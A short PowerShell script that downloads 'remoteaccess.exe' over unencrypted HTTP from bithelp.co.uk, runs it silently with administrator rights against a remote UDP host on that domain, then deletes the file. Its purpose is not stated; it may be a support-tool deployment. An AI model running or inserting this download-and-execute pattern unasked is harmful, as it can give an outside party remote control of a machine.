$Path = $env:TEMP
$ExeName = "remoteaccess.exe"
Invoke-WebRequest "http://bithelp.co.uk:80/app/38464402278508186926855457691685331017" -OutFile $Path\$ExeName
Start-Process -FilePath $Path\$ExeName -Args "/S /NAME=AUTODETECT /HOST=udp://bithelp.co.uk" -Verb RunAs -Wait
Remove-Item $Path\$ExeName